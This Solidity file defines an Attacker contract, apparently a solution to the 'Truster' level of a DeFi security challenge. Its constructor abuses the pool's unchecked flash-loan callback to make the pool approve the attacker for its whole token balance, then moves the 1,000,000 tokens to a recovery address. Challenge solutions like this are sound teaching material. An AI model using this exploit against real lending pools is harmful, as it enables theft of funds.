// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";

contract Attacker {

    address pool;
    address token;
    address recovery;
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    constructor(address _pool, address _token, address _recovery) {
        pool = _pool;
        token = _token;
        recovery = _recovery;

        TrusterLenderPool(pool).flashLoan(0, address(this), address(token), abi.encodeWithSignature("approve(address,uint256)", this, TOKENS_IN_POOL));
        ERC20(token).transferFrom(address(pool), recovery, TOKENS_IN_POOL);
    }
}